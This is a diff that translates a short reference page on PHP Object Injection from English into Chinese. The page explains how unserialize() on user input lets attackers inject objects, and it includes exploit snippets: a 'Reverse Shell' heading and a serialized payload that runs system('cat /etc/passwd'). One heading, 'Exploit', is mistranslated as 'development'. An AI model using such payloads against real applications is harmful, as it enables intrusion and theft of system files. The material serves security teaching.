@@ -1,9 +1,9 @@
-# PHP Object Injection
-PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.	
+# PHP对象注入
+PHP对象注入是一种应用程序级别的漏洞，可以让攻击者执行不同类型的恶意攻击, 例如基于背景的代码注入, SQL资料隐码攻击, 路径遍历和程序拒绝服务攻击. 用户提供的输入在传递给未序列化()PHP函数之前，没有经过适当的消毒处理，就会出现漏洞. 由于PHP允许对象序列化, 攻击者可以将特定的序列化字符串传递给脆弱的非序列化()调用, 导致将一个任意的PHP对象(s)注入到应用程序范围.	
 
-## Exploit
+## 开发
 
-Reverse Shell
+反向shell
 ```php
 class PHPObjectInjection
 {
@@ -14,7 +14,7 @@ class PHPObjectInjection
 echo urlencode(serialize(new PHPObjectInjection));
 ```
 
-Basic detection
+基础检测
 ```php
 class PHPObjectInjection
 {
@@ -27,5 +27,5 @@ echo urlencode(serialize(new PHPObjectInjection));
 //'O:18:"PHPObjectInjection":1:{s:6:"inject";s:26:"system(\'cat+/etc/passwd\');";}'
 ```
 
-## Thanks to
+## 感谢
 * https://www.owasp.org/index.php/PHP_Object_Injection
